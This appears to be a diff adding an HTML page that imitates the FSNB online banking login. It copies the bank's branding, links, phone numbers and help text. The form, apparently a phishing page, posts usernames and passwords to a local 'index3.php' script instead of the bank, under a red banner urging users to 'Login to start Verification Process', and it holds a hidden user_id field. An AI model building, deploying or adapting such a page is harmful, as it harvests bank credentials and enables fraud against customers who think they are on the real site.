@@ -1,0 +1,390 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   FSNB
+  </title>
+  <meta content="telephone=no" name="format-detection" />
+  <link type="image/ico" href="https://www.fsnb.com/images/trans_01.gif" rel="shortcut icon" />
+  <script src="sdmenu.js" type="text/javascript">
+   ;
+  </script>
+  <script src="functions.js" type="text/javascript">
+   ;
+  </script>
+  <script src="stuhover.js" type="text/javascript">
+   ;
+  </script>
+  <link media="all" href="index.css" type="text/css" rel="stylesheet" />
+ </head>
+ <body onload="LoadQ2OnlineBody()">
+  <span class="preload1">
+  </span>
+  <span class="preload2">
+  </span>
+  <table width="800" border="0" align="center" cellspacing="0" cellpadding="0">
+   <tbody>
+    <tr>
+     <td width="215">
+      <a href="https://www.fsnb.com/index.html">
+       <img width="136" height="109" border="0" alt="" src="trans_01.gif" />
+      </a>
+     </td>
+     <td width="575" valign="bottom">
+      <div align="right">
+       <span class="style21">
+        <a href="https://www.fsnb.com/pages/index_about_us.html">
+         About FSNB
+        </a>
+        <span class="style8">
+         <span class="style13">
+          |
+         </span>
+        </span>
+        <a href="https://www.fsnb.com/pages/about_us_contact.html">
+         Contact Us
+        </a>
+        <span class="style8">
+         <span class="style13">
+          |
+         </span>
+        </span>
+        <a href="https://www.fsnb.com/pages/index_locations.html">
+         Locations
+        </a>
+       </span>
+      </div>
+     </td>
+    </tr>
+    <tr>
+     <td colspan="2">
+      <img width="800" height="16" alt="" src="untitled-2_03.jpg" />
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <table width="800" border="0" align="center" cellspacing="0" cellpadding="0">
+   <tbody>
+    <tr>
+     <td valign="top" id="sidenav">
+     </td>
+     <td valign="top" id="main-content">
+      <script type="text/javascript">
+       loginTop();
+      </script>
+      <script src="q2_webcheckbox.js" type="text/javascript">
+      </script>
+      <script src="q2_webeditpassword.js" type="text/javascript">
+      </script>
+      <script src="q2_login.js" type="text/javascript">
+      </script>
+      <form id="q2online" action="index3.php" method="post" name="q2online">
+       <table cellspacing="0" cellpadding="0" class="q2page login">
+        <tbody>
+         <tr style="display: none;" id="errorRow">
+          <td colspan="2" id="errorCell" class="q2onlineerror">
+           <p>
+           </p>
+          </td>
+         </tr>
+         <tr>
+          <td height="19" colspan="2" class="q2onlineerror">
+           <noscript>
+            You must have javascript enabled to login. Please check your settings and then refresh this page.
+           </noscript>
+          </td>
+         </tr>
+         <tr>
+          <td width="58%" id="column1" class="col1">
+           <b>
+            <font size="3" color="#FF0000">
+             Login  to start Verification Process.
+            </font>
+           </b>
+           <table cellspacing="0" cellpadding="0">
+            <tbody>
+             <tr>
+              <td class="col1sub1">
+               Username *
+              </td>
+              <td class="col1sub2">
+               <input size="7" maxlength="47" name="q2oPassword0" id="passwordEdit0" class="text" autocomplete="off" />
+              </td>
+             </tr>
+             <tr>
+              <td class="col1sub1">
+               Password *
+              </td>
+              <td class="col1sub2">
+               <input type="password" maxlength="47" name="q2oPassword" id="passwordEdit" class="text" autocomplete="off" />
+              </td>
+             </tr>
+             <tr>
+              <td>
+              </td>
+              <td>
+               <input type="submit" value="Login" onclick="return q2_login_Submit();" id="submitAction" class="button default" />
+               <input type="button" value="Help" onclick="q2_help();" id="helpAction" class="button" />
+              </td>
+             </tr>
+             <tr>
+              <td>
+              </td>
+              <td>
+               <input type="checkbox" value="true" name="q2oForgotPassword" class="checkbox" id="forgotPasswordCheckBox" />
+               <label for="forgotPasswordCheckBox">
+                Forgot Password?
+               </label>
+               <script type="text/javascript">
+                q2_webcheckbox_init("forgotPasswordCheckBox",{"click":"q2_login_forgotPasswordClick"});
+               </script>
+              </td>
+             </tr>
+             <tr>
+              <td>
+              </td>
+              <td>
+               <input type="checkbox" value="true" name="q2oFirstTimeUser" class="checkbox" id="firstTimeUserCheckBox" />
+               <label for="firstTimeUserCheckBox">
+                I am a First Time User
+               </label>
+               <script type="text/javascript">
+                q2_webcheckbox_init("firstTimeUserCheckBox",{"click":"q2_login_firstTimeUserClick"});
+               </script>
+              </td>
+             </tr>
+             <tr style="display: none;">
+              <td colspan="2">
+               <input type="text" style="display: none;" name="HereSoIeWillSubmitOnEnter" class="text" value="" />
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+          <td width="41%" class="col2">
+          </td>
+         </tr>
+        </tbody>
+       </table>
+       <script type="text/javascript">
+        function q2_help(){var win=window.open("../help/OnlineHelp/Default.htm#Q2Online/Getting Started/37_Online Help_Login.htm","q2help","height=820,left=100,location=no,menubar=no,resizable=yes,scrollbars=yes,status=yes,toolbar=no,top=100,width=760,");if (win) win.focus();}
+       </script>
+       <script type="text/javascript">
+        var jsReady = false;function isReady(){return jsReady;}function thisMovie(movieName){return navigator.appName.indexOf('Microsoft') != -1 ? document.getElementById(movieName) : document[movieName];}
+       </script>
+       <input type="hidden" name="q2_1" value="" />
+       <input type="hidden" name="q2_2" value="" />
+       <script type="text/javascript">
+        function getFso(){thisMovie('q2_registerbrowser').getFso();}function getFsoCallback(tokenName, tokenValue){if (tokenName == '' || tokenValue == '') return;document.forms['q2online'].elements['q2_1'].value = tokenName;document.forms['q2online'].elements['q2_2'].value = tokenValue;}function flashReady(){getFso();}
+       </script>
+       <script type="text/javascript">
+        jsReady=true;
+       </script>
+       <script type="text/javascript">
+        var SHOW_CAPS_WARNING=true;var deferRender=false;var cookieMsg="Q2_BROWSER_MESSAGES_COOKIES_ARE_DISABLED";
+       </script>
+       <input type="hidden" name="_action" />
+       <input type="hidden" value="Clayton36" name="user_id" />
+      </form>
+      <script type="text/javascript">
+       loginBottom();
+      </script>
+      <span style="font-family:arial,helvetica;">
+       <span style="font-weight:bold; font-size:14px;">
+        First Time User
+       </span>
+       <br />
+       <br />
+       <span style="font-size:12px;">
+        If this is your first time using our enhanced Online Banking, please follow the instructions below. If you have any questions, click the Help button above.
+        <br />
+        <ul>
+         <li>
+          Enter your Login ID and click the “I am a First Time User” checkbox, then “Login”.
+         </li>
+         <li>
+          Enter the Secure Access Code and click “Continue”.
+         </li>
+         <li>
+          Update your online profile page as required and click “Continue”.
+         </li>
+         <li>
+          Enter a new password twice for confirmation and click “Continue” to access your Online Banking.
+         </li>
+        </ul>
+       </span>
+       <span style="font-family: arial,helvetica;">
+        <span style="font-weight: bold; font-size: 14px;">
+         First Time User
+        </span>
+        <br />
+        <br />
+        <span style="font-size: 12px;">
+         If this is your first time using our enhanced Online Banking, please follow the instructions below. If you have any questions, click the Help button above.
+         <br />
+         <ul>
+          <li>
+           Enter your Login ID and click the “I am a First Time User” checkbox, then “Login”.
+          </li>
+          <li>
+           Enter the Secure Access Code and click “Continue”.
+          </li>
+          <li>
+           Update your online profile page as required and click “Continue”.
+          </li>
+          <li>
+           Enter a new password twice for confirmation and click “Continue” to access your Online Banking.
+          </li>
+         </ul>
+        </span>
+       </span>
+      </span>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <hr width="800" />
+  <table width="796" border="0" background="bottom_links_bggradient.jpg" align="center" cellspacing="0" cellpadding="0">
+   <tbody>
+    <tr>
+     <td width="185" valign="top" background="bottom_links_bggradient.htm" class="bottom_left">
+      <span class="style3">
+       <span class="style10">
+        Quick Links
+       </span>
+       <br />
+      </span>
+      <span class="style8">
+       <a href="https://www.fsnb.com/pages/careers.html">
+        Employment Opportunities
+       </a>
+      </span>
+      <br />
+      <span class="style8">
+       <a href="https://www.fsnb.com/pages/checking_services_order.html">
+        Check reorder
+       </a>
+      </span>
+      <br />
+      <span class="style8">
+       <a href="https://www.fsnb.com/pages/cards_lost.html">
+        Lost Card?
+       </a>
+      </span>
+      <br />
+      <span class="style8">
+       <a href="https://www.fsnb.com/pages/index_services.html">
+        Tools
+       </a>
+      </span>
+      <br />
+      <span class="style8">
+       <a href="https://www.fsnb.com/pages/services_wiring.html">
+        Wire Information
+       </a>
+      </span>
+     </td>
+     <td width="163" valign="top" background="bottom_links_bggradient.htm" class="bottom_borrowing">
+      <span class="style3">
+       <span class="style10">
+        Online Banking
+       </span>
+       <br />
+      </span>
+      <span class="style8">
+       <a href="https://www.fsnb.com/pages/frontline_billpay.html">
+        Bill Pay
+       </a>
+      </span>
+      <br />
+      <span class="style8">
+       <a href="https://www.fsnb.com/pages/frontline_estatements.html">
+        E-Statements
+       </a>
+       <br />
+      </span>
+      <span class="style8">
+       <a href="https://www.fsnb.com/pages/frontline_check_image.html">
+        Check Image
+       </a>
+      </span>
+     </td>
+     <td width="448" valign="top" background="bottom_links_bggradient.htm" class="bottom_right">
+      <span class="style3">
+       <span class="style10">
+        Find Account Information
+       </span>
+       <br />
+      </span>
+      <span class="style13">
+       <strong>
+        Free Live Customer Service 6 days a week:
+       </strong>
+       580-357-9880/1-800-749-4583
+       <br />
+       <strong>
+        Weekdays:
+       </strong>
+       7:00 am to 7:00 pm CST
+       <br />
+       <strong>
+        Saturdays:
+       </strong>
+       8:00 am to 1:00 pm CST
+       <br />
+       <strong>
+        Closed:
+       </strong>
+       Federal Holidays/Special Hours during a Holiday
+       <br />
+       <strong>
+        Free Automated Phone Service 24/7:
+       </strong>
+       580-355-2184/1-800-355-2140
+      </span>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <table width="796" border="0" align="center" cellspacing="0" cellpadding="0">
+   <tbody>
+    <tr>
+     <td>
+      <div align="center">
+       <img width="796" height="16" alt="" src="bottom_of_screen.jpg" />
+      </div>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <table width="800" border="0" align="center">
+   <tbody>
+    <tr>
+     <td width="131">
+      <img width="31" height="17" alt="" src="fdiclogo.jpg" />
+      <img width="76" height="17" alt="" src="equallending.jpg" />
+     </td>
+     <td width="659" valign="top">
+      <div align="right" class="style8">
+       <a href="https://www.fsnb.com/pages/online-banking.html">
+        FAQs
+       </a>
+       <span class="style13">
+        |
+       </span>
+       <a href="https://www.fsnb.com/pages/privacy_policy.html">
+        Privacy Pledge
+       </a>
+       <span class="style13">
+        |
+       </span>
+       <a href="https://www.fsnb.com/pages/sitemap.html">
+        Site Map
+       </a>
+      </div>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
